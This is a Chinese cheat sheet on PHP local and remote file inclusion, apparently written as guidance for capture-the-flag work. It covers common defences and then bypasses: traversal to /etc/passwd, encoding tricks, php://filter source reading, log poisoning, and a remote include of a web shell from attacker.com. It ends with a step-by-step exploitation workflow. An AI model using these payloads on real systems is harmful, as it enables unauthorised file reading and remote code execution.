# 文件包含（LFI/RFI）：常见防御与绕过

## 1. 基本概念

- **LFI（本地文件包含）**：只允许包含本地文件路径（如 `include $_GET['file'];`），常用于读源码 / 读敏感文件。
- **RFI（远程文件包含）**：在 `allow_url_fopen` / `allow_url_include` 开启时，支持 `http://`、`ftp://` 等远程 URL，可直接执行远程代码。

---

## 2. 常见防御

- **固定前缀/后缀**：`include 'pages/' . $_GET['p'] . '.php';`
- **黑名单/白名单过滤**：过滤 `..`、`/`、`\\`、`:`、`php://`、`data://` 等；或只允许数字 / 固定若干文件名。
- **realpath / basename 校验**：用 `realpath` 判断路径是否在指定目录内，或用 `basename` 限制文件名。
- **关闭远程包含**：`allow_url_fopen=Off`、`allow_url_include=Off`。

---

## 3. 绕过手段

### 3.1 目录遍历与编码

- 目录遍历：`../../../../etc/passwd`、`../../../../var/www/html/config.php` 等。
- 多写/冗余：`....//....//etc/passwd`、`..//..//..//etc/passwd`。
- URL 编码：`..%2f`、`..%252f`，多次编码尝试绕过过滤。

### 3.2 后缀/前缀限制

- 固定后缀 `.php` 场景：
  - 包含日志 / 会话文件 / 上传目录下的马：`/var/log/nginx/access.log` 中插入 PHP 代码后通过包含执行。
  - Windows 系统下可利用 `;` / 空字符截断（老版本），或通过 `.php` 结尾的上传文件。
- 使用空字节截断（老 PHP < 5.3）：`file=../../etc/passwd%00`。

### 3.3 特殊包装器（wrappers）

- **php://filter** 读源码：
  - `php://filter/read=convert.base64-encode/resource=index.php`
  - 解出 base64 后获取源码以继续审计。
- **php://input** 执行 POST 数据（在 `allow_url_include=On` 且 `include 'php://input'` 时可行）。
- **zip/phar 包装器**：`zip://shell.zip#shell.php`、`phar://` 等，配合文件上传 / Phar 反序列化使用。

### 3.4 RFI 场景

- 当 `allow_url_fopen` / `allow_url_include` 开启且未过滤协议时：
  - 直接包含远程马：`?file=http://attacker.com/shell.txt`。
  - 使用自己的服务器返回 `<?php system($_GET['c']); ?>` 等代码。
  - 也可与 SSRF 思路结合，通过内网服务返回恶意 PHP。

---

## 4. 利用流程建议

1. **信息收集与源码审计**
   - 用 `dirsearch_scan` / `curl_request`（as_source=true）找到疑似包含点（`include`/`require`/`load` 等）。
   - 记录：使用的路径前缀/后缀、允许的参数、是否有过滤函数（`str_replace`、`preg_match` 等）。

2. **本地文件读取**
   - 先尝试 `../../etc/passwd`、`/proc/self/environ`、`/var/log/nginx/access.log` 等，确认 LFI 是否可行。
   - 若有固定后缀 `.php`，优先读源码文件（配置、入口）或包含日志中注入的 PHP 代码。

3. **源码解读与链拓展**
   - 若能通过 `php://filter` 获取源码，分析后续可扩展的利用：进一步 RCE、提权读 flag 等。

4. **远程包含/RCE**
   - 若确认为 RFI，可准备远程 WebShell 或一段一次性恶意 PHP 文件，通过 `file` 参数包含执行。
   - 注意题目环境（有时只允许 HTTP，不允许 HTTPS 或需要特定端口）。\n
